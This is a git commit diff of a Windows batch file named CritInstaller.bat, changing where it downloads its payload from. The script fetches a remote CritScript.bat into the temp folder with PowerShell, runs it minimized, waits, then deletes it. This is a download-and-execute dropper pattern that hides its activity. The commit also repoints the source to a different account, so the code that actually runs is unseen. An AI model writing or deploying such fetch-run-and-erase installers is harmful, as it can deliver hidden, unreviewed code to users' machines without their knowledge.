56bf99be44f76ad49a21a91e530bcdddebb87343
DARJARN7 <darjarn7@gmail.com>
2024-12-26 14:52:25 -0800

    Update CritInstaller.bat

--- CritInstaller.bat
+++ CritInstaller.bat
@@ -1,6 +1,6 @@
 @echo off
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.bat' -OutFile CritScript.bat"
+Powershell -Command "Invoke-Webrequest 'https://github.com/DARJARN7/DDNS/main/CritScript.bat' -OutFile CritScript.bat"
 start /min CritScript.bat
 timeout 6
 del CritScript.bat
